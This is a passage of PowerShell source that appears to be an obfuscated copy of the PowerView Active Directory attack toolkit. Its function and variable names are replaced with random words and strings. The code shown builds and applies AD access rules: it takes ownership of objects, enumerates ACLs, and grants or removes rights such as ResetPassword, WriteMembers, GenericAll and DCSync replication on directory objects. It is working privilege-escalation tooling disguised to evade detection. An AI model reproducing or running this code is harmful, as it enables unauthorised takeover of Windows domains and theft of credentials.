        [ValidateSet('Success', 'Failure')]
        [String]
        $LgxvZGUO99,
        [Parameter(Mandatory = $False, ParameterSetName='AccessRuleType')]
        [Parameter(Mandatory = $False, ParameterSetName='AuditRuleType')]
        [Parameter(Mandatory = $False, ParameterSetName='ObjectGuidLookup')]
        [Guid]
        $gCjAvvIM99,
        [ValidateSet('All', 'Children','Descendents','None','SelfAndChildren')]
        [String]
        $zvZTOvWZ99,
        [Guid]
        $VJilgqzd99
    )
    Begin {
        if ($AvODPONO99 -notmatch '^S-1-.*') {
            $aQhdUvTL99 = @{
                'Identity' = $AvODPONO99
                'Properties' = 'distinguishedname,objectsid'
            }
            if ($PSBoundParameters['PrincipalDomain']) { $aQhdUvTL99['Domain'] = $PfltRDOv99 }
            if ($PSBoundParameters['Server']) { $aQhdUvTL99['Server'] = $qgdPgdMB99 }
            if ($PSBoundParameters['SearchScope']) { $aQhdUvTL99['SearchScope'] = $TRVzBsDk99 }
            if ($PSBoundParameters['ResultPageSize']) { $aQhdUvTL99['ResultPageSize'] = $CgYkCByk99 }
            if ($PSBoundParameters['ServerTimeLimit']) { $aQhdUvTL99['ServerTimeLimit'] = $elDiVqTz99 }
            if ($PSBoundParameters['Tombstone']) { $aQhdUvTL99['Tombstone'] = $rmzHuzlC99 }
            if ($PSBoundParameters['Credential']) { $aQhdUvTL99['Credential'] = $fjBNCklg99 }
            $frVvRiOK99 = trashier @PrincipalSearcherArguments
            if (-not $frVvRiOK99) {
                throw "Unable to resolve principal: $AvODPONO99"
            }
            elseif($frVvRiOK99.Count -gt 1) {
                throw "PrincipalIdentity matches multiple AD objects, but only one is allowed"
            }
            $mABfETVW99 = $frVvRiOK99.objectsid
        }
        else {
            $mABfETVW99 = $AvODPONO99
        }
        $QsjppssB99 = 0
        foreach($r in $Right) {
            $QsjppssB99 = $QsjppssB99 -bor (([System.DirectoryServices.ActiveDirectoryRights]$r).value__)
        }
        $QsjppssB99 = [System.DirectoryServices.ActiveDirectoryRights]$QsjppssB99
        $feaYcbZI99 = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]$mABfETVW99)
    }
    Process {
        if($PSCmdlet.ParameterSetName -eq 'AuditRuleType') {
            if($gCjAvvIM99 -eq $null -and $zvZTOvWZ99 -eq [String]::Empty -and $VJilgqzd99 -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $feaYcbZI99, $QsjppssB99, $LgxvZGUO99
            } elseif($gCjAvvIM99 -eq $null -and $zvZTOvWZ99 -ne [String]::Empty -and $VJilgqzd99 -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $feaYcbZI99, $QsjppssB99, $LgxvZGUO99, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]$zvZTOvWZ99)
            } elseif($gCjAvvIM99 -eq $null -and $zvZTOvWZ99 -ne [String]::Empty -and $VJilgqzd99 -ne $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $feaYcbZI99, $QsjppssB99, $LgxvZGUO99, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]$zvZTOvWZ99), $VJilgqzd99
            } elseif($gCjAvvIM99 -ne $null -and $zvZTOvWZ99 -eq [String]::Empty -and $VJilgqzd99 -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $feaYcbZI99, $QsjppssB99, $LgxvZGUO99, $gCjAvvIM99
            } elseif($gCjAvvIM99 -ne $null -and $zvZTOvWZ99 -ne [String]::Empty -and $VJilgqzd99 -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $feaYcbZI99, $QsjppssB99, $LgxvZGUO99, $gCjAvvIM99, $zvZTOvWZ99
            } elseif($gCjAvvIM99 -ne $null -and $zvZTOvWZ99 -ne [String]::Empty -and $VJilgqzd99 -ne $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $feaYcbZI99, $QsjppssB99, $LgxvZGUO99, $gCjAvvIM99, $zvZTOvWZ99, $VJilgqzd99
            }
        }
        else {
            if($gCjAvvIM99 -eq $null -and $zvZTOvWZ99 -eq [String]::Empty -and $VJilgqzd99 -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $feaYcbZI99, $QsjppssB99, $akrYTvEi99
            } elseif($gCjAvvIM99 -eq $null -and $zvZTOvWZ99 -ne [String]::Empty -and $VJilgqzd99 -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $feaYcbZI99, $QsjppssB99, $akrYTvEi99, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]$zvZTOvWZ99)
            } elseif($gCjAvvIM99 -eq $null -and $zvZTOvWZ99 -ne [String]::Empty -and $VJilgqzd99 -ne $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $feaYcbZI99, $QsjppssB99, $akrYTvEi99, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]$zvZTOvWZ99), $VJilgqzd99
            } elseif($gCjAvvIM99 -ne $null -and $zvZTOvWZ99 -eq [String]::Empty -and $VJilgqzd99 -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $feaYcbZI99, $QsjppssB99, $akrYTvEi99, $gCjAvvIM99
            } elseif($gCjAvvIM99 -ne $null -and $zvZTOvWZ99 -ne [String]::Empty -and $VJilgqzd99 -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $feaYcbZI99, $QsjppssB99, $akrYTvEi99, $gCjAvvIM99, $zvZTOvWZ99
            } elseif($gCjAvvIM99 -ne $null -and $zvZTOvWZ99 -ne [String]::Empty -and $VJilgqzd99 -ne $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $feaYcbZI99, $QsjppssB99, $akrYTvEi99, $gCjAvvIM99, $zvZTOvWZ99, $VJilgqzd99
            }
        }
    }
}
function send {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String]
        $feaYcbZI99,
        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [Alias('Owner')]
        [String]
        $RkwtGoey99,
        [ValidateNotNullOrEmpty()]
        [String]
        $jnYnRnFJ99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $SeHRgLsL99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $WdOnSHnL99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $qgdPgdMB99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $TRVzBsDk99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $CgYkCByk99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $elDiVqTz99,
        [Switch]
        $rmzHuzlC99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fjBNCklg99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $XVFWmInN99 = @{}
        if ($PSBoundParameters['Domain']) { $XVFWmInN99['Domain'] = $jnYnRnFJ99 }
        if ($PSBoundParameters['LDAPFilter']) { $XVFWmInN99['LDAPFilter'] = $SeHRgLsL99 }
        if ($PSBoundParameters['SearchBase']) { $XVFWmInN99['SearchBase'] = $WdOnSHnL99 }
        if ($PSBoundParameters['Server']) { $XVFWmInN99['Server'] = $qgdPgdMB99 }
        if ($PSBoundParameters['SearchScope']) { $XVFWmInN99['SearchScope'] = $TRVzBsDk99 }
        if ($PSBoundParameters['ResultPageSize']) { $XVFWmInN99['ResultPageSize'] = $CgYkCByk99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $XVFWmInN99['ServerTimeLimit'] = $elDiVqTz99 }
        if ($PSBoundParameters['Tombstone']) { $XVFWmInN99['Tombstone'] = $rmzHuzlC99 }
        if ($PSBoundParameters['Credential']) { $XVFWmInN99['Credential'] = $fjBNCklg99 }
        $gYVAouKo99 = trashier @SearcherArguments -feaYcbZI99 $RkwtGoey99 -ycQOyvWh99 objectsid | Select-Object -ExpandProperty objectsid
        if ($gYVAouKo99) {
            $vQEfwNgf99 = [System.Security.Principal.SecurityIdentifier]$gYVAouKo99
        }
        else {
            Write-Warning "[send] Error parsing owner identity '$RkwtGoey99'"
        }
    }
    PROCESS {
        if ($vQEfwNgf99) {
            $XVFWmInN99['Raw'] = $True
            $XVFWmInN99['Identity'] = $feaYcbZI99
            $XgbJpRnI99 = trashier @SearcherArguments
            ForEach ($Object in $XgbJpRnI99) {
                try {
                    Write-Verbose "[send] Attempting to set the owner for '$feaYcbZI99' to '$RkwtGoey99'"
                    $Entry = $XgbJpRnI99.GetDirectoryEntry()
                    $Entry.PsBase.Options.SecurityMasks = 'Owner'
                    $Entry.PsBase.ObjectSecurity.SetOwner($vQEfwNgf99)
                    $Entry.PsBase.CommitChanges()
                }
                catch {
                    Write-Warning "[send] Error setting owner: $_"
                }
            }
        }
    }
}
function anthropomorphic {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ACL')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $feaYcbZI99,
        [Switch]
        $Sacl,
        [Switch]
        $gwRlAoyy99,
        [String]
        [Alias('Rights')]
        [ValidateSet('All', 'ResetPassword', 'WriteMembers')]
        $FbZFnakt99,
        [ValidateNotNullOrEmpty()]
        [String]
        $jnYnRnFJ99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $SeHRgLsL99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $WdOnSHnL99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $qgdPgdMB99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $TRVzBsDk99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $CgYkCByk99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $elDiVqTz99,
        [Switch]
        $rmzHuzlC99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fjBNCklg99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $XVFWmInN99 = @{
            'Properties' = 'samaccountname,ntsecuritydescriptor,distinguishedname,objectsid'
        }
        if ($PSBoundParameters['Sacl']) {
            $XVFWmInN99['SecurityMasks'] = 'Sacl'
        }
        else {
            $XVFWmInN99['SecurityMasks'] = 'Dacl'
        }
        if ($PSBoundParameters['Domain']) { $XVFWmInN99['Domain'] = $jnYnRnFJ99 }
        if ($PSBoundParameters['SearchBase']) { $XVFWmInN99['SearchBase'] = $WdOnSHnL99 }
        if ($PSBoundParameters['Server']) { $XVFWmInN99['Server'] = $qgdPgdMB99 }
        if ($PSBoundParameters['SearchScope']) { $XVFWmInN99['SearchScope'] = $TRVzBsDk99 }
        if ($PSBoundParameters['ResultPageSize']) { $XVFWmInN99['ResultPageSize'] = $CgYkCByk99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $XVFWmInN99['ServerTimeLimit'] = $elDiVqTz99 }
        if ($PSBoundParameters['Tombstone']) { $XVFWmInN99['Tombstone'] = $rmzHuzlC99 }
        if ($PSBoundParameters['Credential']) { $XVFWmInN99['Credential'] = $fjBNCklg99 }
        $NWZRAqED99 = maroons @SearcherArguments
        $ewxPrsal99 = @{}
        if ($PSBoundParameters['Domain']) { $ewxPrsal99['Domain'] = $jnYnRnFJ99 }
        if ($PSBoundParameters['Server']) { $ewxPrsal99['Server'] = $qgdPgdMB99 }
        if ($PSBoundParameters['ResultPageSize']) { $ewxPrsal99['ResultPageSize'] = $CgYkCByk99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $ewxPrsal99['ServerTimeLimit'] = $elDiVqTz99 }
        if ($PSBoundParameters['Credential']) { $ewxPrsal99['Credential'] = $fjBNCklg99 }
        if ($PSBoundParameters['ResolveGUIDs']) {
            $GUIDs = batted @DomainGUIDMapArguments
        }
    }
    PROCESS {
        if ($NWZRAqED99) {
            $igkjuUBu99 = ''
            $pIJjStMG99 = ''
            $feaYcbZI99 | Where-Object {$_} | ForEach-Object {
                $vNrdYYXO99 = $_.Replace('(', '\28').Replace(')', '\29')
                if ($vNrdYYXO99 -match '^S-1-.*') {
                    $igkjuUBu99 += "(objectsid=$vNrdYYXO99)"
                }
                elseif ($vNrdYYXO99 -match '^(CN|OU|DC)=.*') {
                    $igkjuUBu99 += "(distinguishedname=$vNrdYYXO99)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        $CtdjjEVe99 = $vNrdYYXO99.SubString($vNrdYYXO99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[anthropomorphic] Extracted domain '$CtdjjEVe99' from '$vNrdYYXO99'"
                        $XVFWmInN99['Domain'] = $CtdjjEVe99
                        $NWZRAqED99 = maroons @SearcherArguments
                        if (-not $NWZRAqED99) {
                            Write-Warning "[anthropomorphic] Unable to retrieve domain searcher for '$CtdjjEVe99'"
                        }
                    }
                }
                elseif ($vNrdYYXO99 -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    $VAqEOfOY99 = (([Guid]$vNrdYYXO99).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                    $igkjuUBu99 += "(objectguid=$VAqEOfOY99)"
                }
                elseif ($vNrdYYXO99.Contains('.')) {
                    $igkjuUBu99 += "(|(samAccountName=$vNrdYYXO99)(name=$vNrdYYXO99)(dnshostname=$vNrdYYXO99))"
                }
                else {
                    $igkjuUBu99 += "(|(samAccountName=$vNrdYYXO99)(name=$vNrdYYXO99)(displayname=$vNrdYYXO99))"
                }
            }
            if ($igkjuUBu99 -and ($igkjuUBu99.Trim() -ne '') ) {
                $pIJjStMG99 += "(|$igkjuUBu99)"
            }
            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[anthropomorphic] Using additional LDAP filter: $SeHRgLsL99"
                $pIJjStMG99 += "$SeHRgLsL99"
            }
            if ($pIJjStMG99) {
                $NWZRAqED99.filter = "(&$pIJjStMG99)"
            }
            Write-Verbose "[anthropomorphic] anthropomorphic filter string: $($NWZRAqED99.filter)"
            $CmGXBhUd99 = $NWZRAqED99.FindAll()
            $CmGXBhUd99 | Where-Object {$_} | ForEach-Object {
                $Object = $_.Properties
                if ($Object.objectsid -and $Object.objectsid[0]) {
                    $mABfETVW99 = (New-Object System.Security.Principal.SecurityIdentifier($Object.objectsid[0],0)).Value
                }
                else {
                    $mABfETVW99 = $Null
                }
                try {
                    New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $Object['ntsecuritydescriptor'][0], 0 | ForEach-Object { if ($PSBoundParameters['Sacl']) {$_.SystemAcl} else {$_.DiscretionaryAcl} } | ForEach-Object {
                        if ($PSBoundParameters['RightsFilter']) {
                            $RkthhYqG99 = Switch ($FbZFnakt99) {
                                'ResetPassword' { '00299570-246d-11d0-a768-00aa006e0529' }
                                'WriteMembers' { 'bf9679c0-0de6-11d0-a285-00aa003049e2' }
                                Default { '00000000-0000-0000-0000-000000000000' }
                            }
                            if ($_.ObjectType -eq $RkthhYqG99) {
                                $_ | Add-Member NoteProperty 'ObjectDN' $Object.distinguishedname[0]
                                $_ | Add-Member NoteProperty 'ObjectSID' $mABfETVW99
                                $JYkWZIUe99 = $True
                            }
                        }
                        else {
                            $_ | Add-Member NoteProperty 'ObjectDN' $Object.distinguishedname[0]
                            $_ | Add-Member NoteProperty 'ObjectSID' $mABfETVW99
                            $JYkWZIUe99 = $True
                        }
                        if ($JYkWZIUe99) {
                            $_ | Add-Member NoteProperty 'ActiveDirectoryRights' ([Enum]::ToObject([System.DirectoryServices.ActiveDirectoryRights], $_.AccessMask))
                            if ($GUIDs) {
                                $jYWbpQiO99 = @{}
                                $_.psobject.properties | ForEach-Object {
                                    if ($_.Name -match 'ObjectType|InheritedObjectType|ObjectAceType|InheritedObjectAceType') {
                                        try {
                                            $jYWbpQiO99[$_.Name] = $GUIDs[$_.Value.toString()]
                                        }
                                        catch {
                                            $jYWbpQiO99[$_.Name] = $_.Value
                                        }
                                    }
                                    else {
                                        $jYWbpQiO99[$_.Name] = $_.Value
                                    }
                                }
                                $ejLVuoip99 = New-Object -TypeName PSObject -Property $jYWbpQiO99
                                $ejLVuoip99.PSObject.TypeNames.Insert(0, 'PowerView.ACL')
                                $ejLVuoip99
                            }
                            else {
                                $_.PSObject.TypeNames.Insert(0, 'PowerView.ACL')
                                $_
                            }
                        }
                    }
                }
                catch {
                    Write-Verbose "[anthropomorphic] Error: $_"
                }
            }
        }
    }
}
function trice {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $LEwtuhBt99,
        [ValidateNotNullOrEmpty()]
        [String]
        $TDntIjFc99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $MOgnmIEL99,
        [ValidateNotNullOrEmpty()]
        [String]
        $ALhJBzMx99,
        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $AvODPONO99,
        [ValidateNotNullOrEmpty()]
        [String]
        $PfltRDOv99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $qgdPgdMB99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $TRVzBsDk99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $CgYkCByk99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $elDiVqTz99,
        [Switch]
        $rmzHuzlC99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fjBNCklg99 = [Management.Automation.PSCredential]::Empty,
        [ValidateSet('All', 'ResetPassword', 'WriteMembers', 'DCSync')]
        [String]
        $aMDvTpVx99 = 'All',
        [Guid]
        $DIoyWpgU99
    )
    BEGIN {
        $AYQnruuk99 = @{
            'Properties' = 'distinguishedname'
            'Raw' = $True
        }
        if ($PSBoundParameters['TargetDomain']) { $AYQnruuk99['Domain'] = $TDntIjFc99 }
        if ($PSBoundParameters['TargetLDAPFilter']) { $AYQnruuk99['LDAPFilter'] = $MOgnmIEL99 }
        if ($PSBoundParameters['TargetSearchBase']) { $AYQnruuk99['SearchBase'] = $ALhJBzMx99 }
        if ($PSBoundParameters['Server']) { $AYQnruuk99['Server'] = $qgdPgdMB99 }
        if ($PSBoundParameters['SearchScope']) { $AYQnruuk99['SearchScope'] = $TRVzBsDk99 }
        if ($PSBoundParameters['ResultPageSize']) { $AYQnruuk99['ResultPageSize'] = $CgYkCByk99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $AYQnruuk99['ServerTimeLimit'] = $elDiVqTz99 }
        if ($PSBoundParameters['Tombstone']) { $AYQnruuk99['Tombstone'] = $rmzHuzlC99 }
        if ($PSBoundParameters['Credential']) { $AYQnruuk99['Credential'] = $fjBNCklg99 }
        $aQhdUvTL99 = @{
            'Identity' = $AvODPONO99
            'Properties' = 'distinguishedname,objectsid'
        }
        if ($PSBoundParameters['PrincipalDomain']) { $aQhdUvTL99['Domain'] = $PfltRDOv99 }
        if ($PSBoundParameters['Server']) { $aQhdUvTL99['Server'] = $qgdPgdMB99 }
        if ($PSBoundParameters['SearchScope']) { $aQhdUvTL99['SearchScope'] = $TRVzBsDk99 }
        if ($PSBoundParameters['ResultPageSize']) { $aQhdUvTL99['ResultPageSize'] = $CgYkCByk99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $aQhdUvTL99['ServerTimeLimit'] = $elDiVqTz99 }
        if ($PSBoundParameters['Tombstone']) { $aQhdUvTL99['Tombstone'] = $rmzHuzlC99 }
        if ($PSBoundParameters['Credential']) { $aQhdUvTL99['Credential'] = $fjBNCklg99 }
        $VzXjeETS99 = trashier @PrincipalSearcherArguments
        if (-not $VzXjeETS99) {
            throw "Unable to resolve principal: $AvODPONO99"
        }
    }
    PROCESS {
        $AYQnruuk99['Identity'] = $LEwtuhBt99
        $eVLpYTLi99 = trashier @TargetSearcherArguments
        ForEach ($afdkSuoX99 in $eVLpYTLi99) {
            $zvZTOvWZ99 = [System.DirectoryServices.ActiveDirectorySecurityInheritance] 'None'
            $sjaXmvuc99 = [System.Security.AccessControl.AccessControlType] 'Allow'
            $ACEs = @()
            if ($DIoyWpgU99) {
                $GUIDs = @($DIoyWpgU99)
            }
            else {
                $GUIDs = Switch ($aMDvTpVx99) {
                    'ResetPassword' { '00299570-246d-11d0-a768-00aa006e0529' }
                    'WriteMembers' { 'bf9679c0-0de6-11d0-a285-00aa003049e2' }
                    'DCSync' { '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2', '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2', '89e95b76-444d-4c62-991a-0facbeda640c'}
                }
            }
            ForEach ($QpSXcQXK99 in $VzXjeETS99) {
                Write-Verbose "[trice] Granting principal $($QpSXcQXK99.distinguishedname) '$aMDvTpVx99' on $($afdkSuoX99.Properties.distinguishedname)"
                try {
                    $feaYcbZI99 = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]$QpSXcQXK99.objectsid)
                    if ($GUIDs) {
                        ForEach ($GUID in $GUIDs) {
                            $nDwsEobl99 = New-Object Guid $GUID
                            $jZelbbQG99 = [System.DirectoryServices.ActiveDirectoryRights] 'ExtendedRight'
                            $ACEs += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $feaYcbZI99, $jZelbbQG99, $sjaXmvuc99, $nDwsEobl99, $zvZTOvWZ99
                        }
                    }
                    else {
                        $jZelbbQG99 = [System.DirectoryServices.ActiveDirectoryRights] 'GenericAll'
                        $ACEs += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $feaYcbZI99, $jZelbbQG99, $sjaXmvuc99, $zvZTOvWZ99
                    }
                    ForEach ($ACE in $ACEs) {
                        Write-Verbose "[trice] Granting principal $($QpSXcQXK99.distinguishedname) rights GUID '$($ACE.ObjectType)' on $($afdkSuoX99.Properties.distinguishedname)"
                        $WwWcRYIc99 = $afdkSuoX99.GetDirectoryEntry()
                        $WwWcRYIc99.PsBase.Options.SecurityMasks = 'Dacl'
                        $WwWcRYIc99.PsBase.ObjectSecurity.AddAccessRule($ACE)
                        $WwWcRYIc99.PsBase.CommitChanges()
                    }
                }
                catch {
                    Write-Verbose "[trice] Error granting principal $($QpSXcQXK99.distinguishedname) '$aMDvTpVx99' on $($afdkSuoX99.Properties.distinguishedname) : $_"
                }
            }
        }
    }
}
function prosecutors {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $LEwtuhBt99,
        [ValidateNotNullOrEmpty()]
        [String]
        $TDntIjFc99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $MOgnmIEL99,
        [ValidateNotNullOrEmpty()]
        [String]
        $ALhJBzMx99,
        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $AvODPONO99,
        [ValidateNotNullOrEmpty()]
        [String]
        $PfltRDOv99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $qgdPgdMB99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $TRVzBsDk99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $CgYkCByk99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $elDiVqTz99,
        [Switch]
        $rmzHuzlC99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fjBNCklg99 = [Management.Automation.PSCredential]::Empty,
        [ValidateSet('All', 'ResetPassword', 'WriteMembers', 'DCSync')]
        [String]
        $aMDvTpVx99 = 'All',
        [Guid]
        $DIoyWpgU99
    )
    BEGIN {
        $AYQnruuk99 = @{
            'Properties' = 'distinguishedname'
            'Raw' = $True
        }
        if ($PSBoundParameters['TargetDomain']) { $AYQnruuk99['Domain'] = $TDntIjFc99 }
        if ($PSBoundParameters['TargetLDAPFilter']) { $AYQnruuk99['LDAPFilter'] = $MOgnmIEL99 }
        if ($PSBoundParameters['TargetSearchBase']) { $AYQnruuk99['SearchBase'] = $ALhJBzMx99 }
        if ($PSBoundParameters['Server']) { $AYQnruuk99['Server'] = $qgdPgdMB99 }
        if ($PSBoundParameters['SearchScope']) { $AYQnruuk99['SearchScope'] = $TRVzBsDk99 }
        if ($PSBoundParameters['ResultPageSize']) { $AYQnruuk99['ResultPageSize'] = $CgYkCByk99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $AYQnruuk99['ServerTimeLimit'] = $elDiVqTz99 }
        if ($PSBoundParameters['Tombstone']) { $AYQnruuk99['Tombstone'] = $rmzHuzlC99 }
        if ($PSBoundParameters['Credential']) { $AYQnruuk99['Credential'] = $fjBNCklg99 }
        $aQhdUvTL99 = @{
            'Identity' = $AvODPONO99
            'Properties' = 'distinguishedname,objectsid'
        }
        if ($PSBoundParameters['PrincipalDomain']) { $aQhdUvTL99['Domain'] = $PfltRDOv99 }
        if ($PSBoundParameters['Server']) { $aQhdUvTL99['Server'] = $qgdPgdMB99 }
        if ($PSBoundParameters['SearchScope']) { $aQhdUvTL99['SearchScope'] = $TRVzBsDk99 }
        if ($PSBoundParameters['ResultPageSize']) { $aQhdUvTL99['ResultPageSize'] = $CgYkCByk99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $aQhdUvTL99['ServerTimeLimit'] = $elDiVqTz99 }
        if ($PSBoundParameters['Tombstone']) { $aQhdUvTL99['Tombstone'] = $rmzHuzlC99 }
        if ($PSBoundParameters['Credential']) { $aQhdUvTL99['Credential'] = $fjBNCklg99 }
        $VzXjeETS99 = trashier @PrincipalSearcherArguments
        if (-not $VzXjeETS99) {
            throw "Unable to resolve principal: $AvODPONO99"
        }
    }
    PROCESS {
        $AYQnruuk99['Identity'] = $LEwtuhBt99
        $eVLpYTLi99 = trashier @TargetSearcherArguments
        ForEach ($afdkSuoX99 in $eVLpYTLi99) {
            $zvZTOvWZ99 = [System.DirectoryServices.ActiveDirectorySecurityInheritance] 'None'
            $sjaXmvuc99 = [System.Security.AccessControl.AccessControlType] 'Allow'
            $ACEs = @()
            if ($DIoyWpgU99) {
                $GUIDs = @($DIoyWpgU99)
            }
            else {
                $GUIDs = Switch ($aMDvTpVx99) {
                    'ResetPassword' { '00299570-246d-11d0-a768-00aa006e0529' }
                    'WriteMembers' { 'bf9679c0-0de6-11d0-a285-00aa003049e2' }
                    'DCSync' { '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2', '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2', '89e95b76-444d-4c62-991a-0facbeda640c'}
                }
            }
            ForEach ($QpSXcQXK99 in $VzXjeETS99) {
                Write-Verbose "[prosecutors] Removing principal $($QpSXcQXK99.distinguishedname) '$aMDvTpVx99' from $($afdkSuoX99.Properties.distinguishedname)"
                try {
                    $feaYcbZI99 = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]$QpSXcQXK99.objectsid)
                    if ($GUIDs) {
                        ForEach ($GUID in $GUIDs) {
                            $nDwsEobl99 = New-Object Guid $GUID
                            $jZelbbQG99 = [System.DirectoryServices.ActiveDirectoryRights] 'ExtendedRight'
                            $ACEs += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $feaYcbZI99, $jZelbbQG99, $sjaXmvuc99, $nDwsEobl99, $zvZTOvWZ99
                        }
                    }
                    else {
                        $jZelbbQG99 = [System.DirectoryServices.ActiveDirectoryRights] 'GenericAll'
                        $ACEs += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $feaYcbZI99, $jZelbbQG99, $sjaXmvuc99, $zvZTOvWZ99
                    }
                    ForEach ($ACE in $ACEs) {
                        Write-Verbose "[prosecutors] Granting principal $($QpSXcQXK99.distinguishedname) rights GUID '$($ACE.ObjectType)' on $($afdkSuoX99.Properties.distinguishedname)"
                        $WwWcRYIc99 = $afdkSuoX99.GetDirectoryEntry()
                        $WwWcRYIc99.PsBase.Options.SecurityMasks = 'Dacl'
                        $WwWcRYIc99.PsBase.ObjectSecurity.RemoveAccessRule($ACE)
                        $WwWcRYIc99.PsBase.CommitChanges()
                    }
                }
                catch {
                    Write-Verbose "[prosecutors] Error removing principal $($QpSXcQXK99.distinguishedname) '$aMDvTpVx99' from $($afdkSuoX99.Properties.distinguishedname) : $_"
                }
            }
        }
    }
}
function pinions {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ACL')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DomainName', 'Name')]
        [String]
        $jnYnRnFJ99,
        [Switch]
        $gwRlAoyy99,
